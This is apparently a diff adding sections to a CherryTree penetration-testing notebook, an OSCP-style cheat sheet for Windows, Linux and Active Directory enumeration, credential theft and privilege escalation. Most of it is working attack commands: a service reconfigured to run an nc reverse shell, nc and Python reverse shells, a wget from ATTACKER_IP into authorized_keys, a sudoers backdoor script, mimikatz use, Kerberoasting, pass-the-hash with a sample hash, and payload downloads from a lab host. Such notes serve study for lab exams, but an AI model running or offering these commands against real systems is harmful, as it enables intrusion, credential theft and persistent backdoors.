+        $SPN       
+    }
+    Write-host ""
+}
+
+</rich_text>
+    <rich_text scale="h2"># Get user accounts which have SPN</rich_text>
+    <rich_text>
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.filter = "(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$results = $search.Findall()
+foreach($result in $results)
+{
+    $userEntry = $result.GetDirectoryEntry()
+    Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
+    Write-host "SPNs"        
+    foreach($SPN in $userEntry.servicePrincipalName)
+    {
+        $SPN       
+    }
+    Write-host ""
+}
+
+</rich_text>
+    <rich_text scale="h2"># WMIC help</rich_text>
+    <rich_text>
+wmic /?
+
+</rich_text>
+    <rich_text scale="h2"># patchlevel</rich_text>
+    <rich_text>
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+# Grep for particular patch
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+</rich_text>
+    <rich_text scale="h2"># Check typical files for passwords</rich_text>
+    <rich_text>
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+</rich_text>
+    <rich_text scale="h2"># SYSVOL passwords... (msf or powersploit)
+# Other files that can contain passwords</rich_text>
+    <rich_text>
+Services\Services.xml
+ScheduledTasks\ScheduledTasks.xml
+Printers\Printers.xml
+Drives\Drives.xml
+DataSources\DataSources.xml
+ 
+</rich_text>
+    <rich_text scale="h2">Enumeration - Programs, Processes and Services </rich_text>
+    <rich_text>
+tasklist /SVC
+schtasks /query /fo LIST /v
+net start
+accesschk_old.exe -uwcqv “Authenticated Users” * /accepteula
+accesschk_old.exe -ucqv upnphost
+sc qc upnphost
+sc config upnphost binpath= “C:\Windows\Temp\nc.exe -nv 10.11.0.179 51337 -e C:\Windows\System32\cmd.exe”
+sc config upnphost obj= “.\LocalSystem” password= “”
+net stop upnphost
+net start upnphost
+Installed Software and permissions 
+
+</rich_text>
+    <rich_text scale="h2"># Get installed software</rich_text>
+    <rich_text>
+dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+powershell&gt; Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+powershell&gt; Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
+</rich_text>
+    <rich_text scale="h2"># Full permissions for everyone or users ?</rich_text>
+    <rich_text>
+icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"
+icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users"
+
+</rich_text>
+    <rich_text scale="h2"># Also possible to do it using accesschk from sysinternals</rich_text>
+    <rich_text>
+accesschk.exe -qwsu "Everyone" *
+accesschk.exe -qwsu "Authenticated Users" *
+accesschk.exe -qwsu "Users" *
+
+Processes and Services 
+</rich_text>
+    <rich_text scale="h2"># Get processes and services</rich_text>
+    <rich_text>
+tasklist /svc
+tasklist /v
+net start
+sc query
+
+powershell&gt; Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
+powershell&gt; Get-Service
+powershell&gt; Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+
+</rich_text>
+    <rich_text scale="h2"># Weak and reocnfigurable services ?</rich_text>
+    <rich_text>
+accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Users" *
+
+</rich_text>
+    <rich_text scale="h2"># Service list, many output</rich_text>
+    <rich_text>
+wmic service list
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+</rich_text>
+    <rich_text scale="h2"># ANy Unquoted Service paths ? </rich_text>
+    <rich_text>
+wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i "Auto" 2&gt;nul |findstr /i /v "C:\Windows\\" 2&gt;nul |findstr /i /v """
+powershell&gt; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+
+</rich_text>
+    <rich_text scale="h2"># Scheduled Tasks</rich_text>
+    <rich_text>
+schtasks /query /fo LIST 2&gt;nul | findstr TaskName
+dir C:\windows\tasks
+powershell&gt; Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+</rich_text>
+    <rich_text scale="h2"># Startup</rich_text>
+    <rich_text>
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+
+powershell&gt; Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+powershell&gt; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
+powershell&gt; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+powershell&gt; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+powershell&gt; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+powershell&gt; Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+powershell&gt; Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+</rich_text>
+    <rich_text scale="h2"># Dump process memory from PowerShell
+# Powershell procdump
+https://gist.github.com/jlawhon/faac02887526746aff468436dc54043d</rich_text>
+    <rich_text>
+ 
+</rich_text>
+    <rich_text scale="h2">Enumeration - Files </rich_text>
+    <rich_text>
+dir /a /s *pass* == *cred* == *vnc* == *.config* == *proof.txt* == *local.txt*
+findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs 2&gt;nul
+type “C:\Documents and Settings\Administrator\Desktop\proof.txt”
+
+</rich_text>
+    <rich_text scale="h2"># Passwords in the registry</rich_text>
+    <rich_text>
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+
+</rich_text>
+    <rich_text scale="h2"># Unattended files or sysprep not cleaned ?</rich_text>
+    <rich_text>
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul
+powershell&gt; Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
+
+</rich_text>
+    <rich_text scale="h2"># On IIS, what's in inetpub, web.config ?</rich_text>
+    <rich_text>
+dir /a C:\inetpub\
+dir /s web.config
+C:\Windows\System32\inetsrv\config\applicationHost.config
+powershell&gt; Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+
+</rich_text>
+    <rich_text scale="h2"># IIS logs</rich_text>
+    <rich_text>
+C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
+
+</rich_text>
+    <rich_text scale="h2"># XAMPP, Apache, or PHP, configuration files ? </rich_text>
+    <rich_text>
+dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+powershell&gt; Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
+
+</rich_text>
+    <rich_text scale="h2"># Interesting files ? </rich_text>
+    <rich_text>
+dir /s *pass* == *vnc* == *.config* 2&gt;nul
+powershell&gt; Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
+
+</rich_text>
+    <rich_text scale="h2"># Files containing password ?</rich_text>
+    <rich_text>
+findstr /si password *.xml *.ini *.txt *.config 2&gt;nul
+powershell&gt; Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
+ 
+</rich_text>
+    <rich_text scale="h2">GPO </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2"># Group Policy Preference
+# Output environment-variables</rich_text>
+    <rich_text>
+set
+
+</rich_text>
+    <rich_text scale="h2"># Look for the following:</rich_text>
+    <rich_text>
+LOGONSERVER=\\NAMEOFSERVER
+USERDNSDOMAIN=WHATEVER.LOCAL
+
+</rich_text>
+    <rich_text scale="h2"># Look up ip-addres</rich_text>
+    <rich_text>
+nslookup nameofserver.whatever.local
+
+</rich_text>
+    <rich_text scale="h2"># It will output something like this</rich_text>
+    <rich_text>
+Address:  192.168.1.101
+
+</rich_text>
+    <rich_text scale="h2"># Now we mount it</rich_text>
+    <rich_text>
+net use z: \\192.168.1.101\SYSVOL
+
+</rich_text>
+    <rich_text scale="h2"># And enter it</rich_text>
+    <rich_text>
+z:
+
+</rich_text>
+    <rich_text scale="h2"># Now we search for the groups.xml file</rich_text>
+    <rich_text>
+dir Groups.xml /s
+ 
+</rich_text>
+    <rich_text scale="h2">Gathering Passwords/Hashes 
+# VNC</rich_text>
+    <rich_text>
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+</rich_text>
+    <rich_text scale="h2"># Windows autologin</rich_text>
+    <rich_text>
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+</rich_text>
+    <rich_text scale="h2"># SNMP Paramters</rich_text>
+    <rich_text>
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+</rich_text>
+    <rich_text scale="h2"># Putty</rich_text>
+    <rich_text>
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+</rich_text>
+    <rich_text scale="h2"># Search for password in registry</rich_text>
+    <rich_text>
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+# You can find passwords in arbitrary files
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+</rich_text>
+    <rich_text scale="h2"># Find all passwords in all files</rich_text>
+    <rich_text>
+findstr /spin "password" *.*
+
+</rich_text>
+    <rich_text scale="h2"># Some common files to find them in</rich_text>
+    <rich_text>
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+
+</rich_text>
+    <rich_text scale="h2"># Stuff in the registry</rich_text>
+    <rich_text>
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+</rich_text>
+    <rich_text scale="h2"># Search for passwords in the registry</rich_text>
+    <rich_text>
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+</rich_text>
+    <rich_text scale="h2"># searhc for files containing keywoards</rich_text>
+    <rich_text>
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+</rich_text>
+    <rich_text scale="h2"># Interesting files</rich_text>
+    <rich_text>
+C:\unattend.xml
+C:\sysprep.inf
+C:\sysprep\sysprep.xml
+# Enumerate stored WiFi settings and get possible stored passwords
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "(Key Content|Contenu de la clé)\W+\:(.+)$" | %{$pass=$_.Matches.Groups[2].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+.\PwDump7.exe (nécessite libay32.dll) =&gt; Dump SAM base
+.\mimikatz.exe
+    privilege::debug
+    privilege::backup
+    token::elevate
+# SAM and SYSTEM files
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+Offensive Security Cheatsheet (haax.fr)
+
+</rich_text>
+    <rich_text scale="h1">Linux:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2">What's the OS? What version? What architecture?</rich_text>
+    <rich_text>
+cat /etc/*-release
+uname -i
+lsb_release -a (Debian based OSs)
+
+</rich_text>
+    <rich_text scale="h2">Who are we? Where are we?</rich_text>
+    <rich_text>
+​id
+pwd
+
+</rich_text>
+    <rich_text scale="h2">Who uses the box? What users? (And which ones have a valid shell)</rich_text>
+    <rich_text>
+cat /etc/passwd
+grep -vE "nologin|false" /etc/passwd
+
+</rich_text>
+    <rich_text scale="h2">What's currently running on the box? What active network services are there?</rich_text>
+    <rich_text>
+ps aux
+netstat -antup
+
+</rich_text>
+    <rich_text scale="h2">What's installed? What kernel is being used?</rich_text>
+    <rich_text>
+dpkg -l (Debian based OSs)
+rpm -qa (CentOS / openSUSE )
+uname -a
+
+</rich_text>
+    <rich_text scale="h2">To find usernames that dont need a login, run this command: </rich_text>
+    <rich_text>
+grep -vE "nologin|false" /etc/passwd
+
+</rich_text>
+    <rich_text scale="h2">To see what is running on a machine, run this command:</rich_text>
+    <rich_text>
+ps aux
+
+</rich_text>
+    <rich_text scale="h2">To see ports that the machine is running, run this command:</rich_text>
+    <rich_text>
+netstat -antup
+
+cat /etc/passwd
+
+</rich_text>
+    <rich_text scale="h2">To what is installed on a machine, run:</rich_text>
+    <rich_text>
+dpkg -l
+cat /usr/share
+
+</rich_text>
+    <rich_text scale="h2">To do an access check on Linux OS, run this:</rich_text>
+    <rich_text>
+kali@kali: find / -writable -type d 2&gt;/dev/null
+
+</rich_text>
+    <rich_text scale="h2">To find drivers and kernel modules on Linux OS, run this:</rich_text>
+    <rich_text>
+kali@kali: ls mod
+
+</rich_text>
+    <rich_text scale="h2">To find out more about a specific mod, run this:</rich_text>
+    <rich_text>
+kali@kali: /sbin/modinfo libata
+
+</rich_text>
+    <rich_text scale="h2">To enumerate binaries that autoelevate on LinuxOS, run this:</rich_text>
+    <rich_text>
+find / -perm -u=s -type f 2&gt;/dev/null
+
+
+hostname
+whoami
+id
+ifconfig
+uname -a
+uname -m
+
+</rich_text>
+    <rich_text scale="h2"># Check version using </rich_text>
+    <rich_text>
+searchsploit -w distrib
+searchsploit -w kernel_version
+
+
+</rich_text>
+    <rich_text scale="h2"># Test trivials login combinaison
+# check /etc/passwd
+# then su login=password
+
+# Look for known machines</rich_text>
+    <rich_text>
+arp -a
+
+</rich_text>
+    <rich_text scale="h2"># Get network configuration</rich_text>
+    <rich_text>
+/sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname
+
+</rich_text>
+    <rich_text scale="h2"># Find Linux distribution and version</rich_text>
+    <rich_text>
+cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;
+
+</rich_text>
+    <rich_text scale="h2"># Get environment variables</rich_text>
+    <rich_text>
+cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
+
+</rich_text>
+    <rich_text scale="h2"># Look for files and getting filename, path, user, group, mode as columns</rich_text>
+    <rich_text>
+find /home -printf -type f "%f\t%p\t%u\t%g\%m\n" 2&gt;/dev/null | column -t
+ 
+</rich_text>
+    <rich_text scale="h2">Enumerate Running Services </rich_text>
+    <rich_text>
+netstat -lantp
+lsof -i
+sockstat -l
+ss -lantp
+
+</rich_text>
+    <rich_text scale="h2"># Find printers</rich_text>
+    <rich_text>
+lpstat -a
+
+</rich_text>
+    <rich_text scale="h2"># Network
+# TCP ports, UDP ports, numerical adresses, only listening ports, PID of process</rich_text>
+    <rich_text>
+netstat -tunlp
+ 
+</rich_text>
+    <rich_text scale="h2">Checking Different Things </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2"># Check sudo rights</rich_text>
+    <rich_text>
+sudo -l
+
+</rich_text>
+    <rich_text scale="h2"># User bash history</rich_text>
+    <rich_text>
+cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history
+
+</rich_text>
+    <rich_text scale="h2"># Look for writable configuration files</rich_text>
+    <rich_text>
+find /etc/ -writable -type f 2&gt;/dev/null
+
+</rich_text>
+    <rich_text scale="h2"># Checks web config files or databases config files</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2"># If one of them is here, exploits can be compiled on the target machine</rich_text>
+    <rich_text>
+which gcc g++ cc
+
+</rich_text>
+    <rich_text scale="h2"># Look for SUID or GUID binaries</rich_text>
+    <rich_text>
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2&gt;/dev/null
+find / -perm -1000 -type d 2&gt;/dev/null
+find / -perm -g=s -type f 2&gt;/dev/null
+
+</rich_text>
+    <rich_text scale="h2"># ARP cache can get you new IP</rich_text>
+    <rich_text>
+cat /proc/net/arp
+ 
+</rich_text>
+    <rich_text scale="h2">Pspy </rich_text>
+    <rich_text>
+# pspy is a command line tool designed to snoop on processes without need 
+# for root permissions. It allows you to see commands run by other 
+# users, cron jobs, etc. as they execute.
+https://github.com/DominicBreuker/pspy
+ 
+</rich_text>
+    <rich_text scale="h2">Useful scripts </rich_text>
+    <rich_text>
+https://github.com/pentestmonkey/unix-privesc-check
+https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+</rich_text>
+    <rich_text scale="h2"># Check for root cron jobs</rich_text>
+    <rich_text>
+https://github.com/codingo/OSCP-2/blob/master/BASH/CronJobChecker.sh
+
+</rich_text>
+    <rich_text scale="h2"># LinuxPrivCheck</rich_text>
+    <rich_text>
+https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh
+
+</rich_text>
+    <rich_text scale="h2"># Clear and efficient</rich_text>
+    <rich_text>
+https://github.com/diego-treitos/linux-smart-enumeration
+ 
+</rich_text>
+    <rich_text scale="h2">Swap Digger </rich_text>
+    <rich_text>
+https://github.com/sevagas/swap_digger
+
+# swap_digger is a bash script used to automate Linux swap analysis for post-exploitation 
+# or forensics purpose. It automates swap extraction and searches for Linux user credentials,
+# Web form credentials, Web form emails, HTTP basic authentication, WiFi SSID and keys, etc.
+
+ ./swap_digger.sh [ OPTIONS ]
+ Options : 
+  -x, --extended    Run Extended tests on the target swap to retrieve other interesting data
+        (web passwords, emails, wifi creds, most accessed urls, etc)
+  -g, --guessing  Try to guess potential passwords based on observations and stats
+        Warning: This option is not reliable, it may dig more passwords as well as hundreds false positives.
+  -h, --help    Display this help.
+  -v, --verbose Verbose mode.
+  -l, --log Log all outputs in a log file (protected inside the generated working directory).
+  -c, --clean Automatically erase the generated working directory at end of script (will also remove log file)
+  -r PATH, --root-path=PATH   Location of the target file-system root (default value is /)
+        Change this value for forensic analysis when target is a mounted file system.
+        This option has to  be used along the -s option to indicate path to swap device.
+  -s PATH, --swap-path=PATH   Location of swap device or swap dump to analyse
+        Use this option for forensic/remote analysis of a swap dump or a mounted external swap partition.
+        This option should be used with the -r option where at least /&lt;root-path&gt;/etc/shadow exists.
+  -S, --swap-search   Search for all available swap devices (use for forensics).
+
+
+</rich_text>
+    <rich_text scale="h2">To find usernames that dont need a login, run this command: grep -vE "nologin|false" /etc/passwd</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">To see what is running on a machine, run this command:</rich_text>
+    <rich_text>
+ps aux
+
+</rich_text>
+    <rich_text scale="h2">To see ports that the machine is running, run this command:</rich_text>
+    <rich_text>
+netstat -antup
+
+cat /etc/passwd
+
+</rich_text>
+    <rich_text scale="h2">To what is installed on a machine, run:</rich_text>
+    <rich_text>
+dpkg -l
+
+
+</rich_text>
+    <rich_text scale="h2">Last thing is to get the kernel which is being used currently, in case there's any low hanging fruit exploits targeting it:</rich_text>
+    <rich_text>
+
+
+</rich_text>
+  </node>
+  <node name="Active Directory" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633114325" ts_lastsave="1633349057">
+    <rich_text scale="h2">To list users on the compromised machine, run:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">net users</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">To list users on the compromised domain, run:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">net users /domain</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">To list groups on the compromised domain, run:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">net groups /domain</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">To fully enumerate a user on the domain, run:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">net user {username} /domain</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">Bloodhound can be used to enumerate domains:</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">Powerview can be used to enumerate domains:</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">In AD, if you have administrative privileges, try option 1:</rich_text>
+    <rich_text>
+Dumping User Passwords from Windows Memory with Mimikatz | Windows OS Hub (woshub.com)
+
+</rich_text>
+    <rich_text scale="h2">or option 2:</rich_text>
+    <rich_text>
+Kerberoasting Steps:
+Get Users with SPNs:
+powershell -c “.\GetUserSPNs.ps1”
+ 
+Get Service Tickets
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/svMSSQL.svcorp.com"  
+ 
+Extract Tickets
+mimikatz # kerberos::list /export
+ 
+Crack Tickets
+python3 tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+
+</rich_text>
+    <rich_text scale="h2">or option 3:</rich_text>
+    <rich_text>
+Pass the hash method
+wmiexec.py -hashes "00000000000000000000000000000000:08df3c73ded940e1f2bcf5eea4b8dbf6" tris@10.11.1.20
+ 
+then connect tot the servers via psexec.py
+Use psexec to log into windows
+Use mimikatzx64noerror.exe 
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Kerberoasting Steps:</rich_text>
+    <rich_text>
+1. Get Users with SPNs:
+
+powershell -c “.\GetUserSPNs.ps1”
+ 
+1. Get Service Tickets
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"  
+ 
+1. Extract Tickets
+
+mimikatz # kerberos::list /export
+ 
+1. Crack Tickets
+
+python3 tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+ ==&gt; sudo python3 kirbi2hashcat.py 2-40a1****-xor-app59\$@M***LSvc\~xor-app**.xor.com\~1**3-XOR.COM.kirbi &gt; tickets0.txt
+Crack using hashcat:
+hashcat -m 13100 &lt;hash file&gt; &lt;wordlist
+Do this before download string: powershell -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
+
+use powershell -c “”
+start sharphound.exe
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.203:8000/SharpHound.ps1")
+$url = "http://192.168.119.203:8000/SharpHound.ps1"
+$output = "$PSScriptRoot\10meg.test"
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.203:8000/putty-64bit-0.76-installer.msi")
+
+</rich_text>
+    <rich_text scale="h2">AD enumeration commands:</rich_text>
+    <rich_text>
+Get-NetUser | select cn
+Get-NetGroup -GroupName *admin*
+(need to download the powerview script first (PowerView.ps1))
+
+When it comes to AD, always check for domain names. For example: a server with a domain name of xor.com can be used to create an admin account like so: admin@xor.com
+
+
+</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf">45051-abusing-kerberos---kerberoasting.pdf (exploit-db.com)</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/#:~:text=%20Dumping%20User%20Passwords%20from%20Windows%20Memory%20with,save%20passwords%20in%20Windows%20Credential%20Manager...%20More%20">Dumping User Passwords from Windows Memory with Mimikatz | Windows OS Hub (woshub.com)</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">How To Attack Kerberos 101 (m0chan.github.io)</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/">https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/</rich_text>
+    <rich_text> </rich_text>
+  </node>
+  <node name="Privilege Escalation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633114640" ts_lastsave="1633369583">
+    <rich_text scale="h1">Linux: </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2">Sudoedit:</rich_text>
+    <rich_text>
+www-data@luigi cat &gt; sudoedit &lt;&lt; _EOF
+&gt;#!/bin/sh
+&gt;echo ALEX-ALEX
+&gt;su
+&gt;/bin/su
+&gt;/usr/bin/su
+&gt;_EOF
+www-data@luigi chmod a+x ./sudoedit
+www-data@luigi sudo ./sudoedit /etc/apache2/apache.conf
+
+</rich_text>
+    <rich_text scale="h2"># Look for strange process</rich_text>
+    <rich_text>
+ps aux
+
+</rich_text>
+    <rich_text scale="h2"># Look for setuid programs (everyone can run them as root)</rich_text>
+    <rich_text>
+find / -perm -4000
+
+</rich_text>
+    <rich_text scale="h2"># Example, if perl</rich_text>
+    <rich_text>
+perl -e ‘$ENV{PATH}="/usr/bin";system("whoami");’ → root
+
+</rich_text>
+    <rich_text scale="h2"># List processes running as root, permissions and NFS exports</rich_text>
+    <rich_text>
+echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/null
+
+</rich_text>
+    <rich_text scale="h2"># Get a TTY shell after a reverse shell connection</rich_text>
+    <rich_text>
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+</rich_text>
+    <rich_text scale="h2"># Set PATH TERM and SHELL if they're missing</rich_text>
+    <rich_text>
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=bash
+
+</rich_text>
+    <rich_text scale="h2"># Add public key to authorized keys</rich_text>
+    <rich_text>
+echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) &gt;&gt; ~/.ssh/authorized_keys
+
+</rich_text>
+    <rich_text scale="h2"># if RSA key is added for 127.0.0.1 you can switch users</rich_text>
+    <rich_text>
+ssh -i id_rsa root@127.0.0.1
+ 
+</rich_text>
+    <rich_text scale="h2"># Add an user to sudoers in python</rich_text>
+    <rich_text>
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('echo "username ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers')
+except:
+        sys.exit()
+ 
+</rich_text>
+    <rich_text scale="h2"># Some payloads to overcome limited shells</rich_text>
+    <rich_text>
+ssh user@$ip nc $localip 4444 -e /bin/sh
+python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=linux
+
+</rich_text>
+    <rich_text scale="h2"># Python</rich_text>
+    <rich_text>
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+</rich_text>
+    <rich_text scale="h2"># Bash</rich_text>
+    <rich_text>
+echo os.system('/bin/bash')
+/bin/sh -i
+exec "/bin/sh";
+
+</rich_text>
+    <rich_text scale="h2"># Perl</rich_text>
+    <rich_text>
+perl —e 'exec "/bin/sh";'
+
+</rich_text>
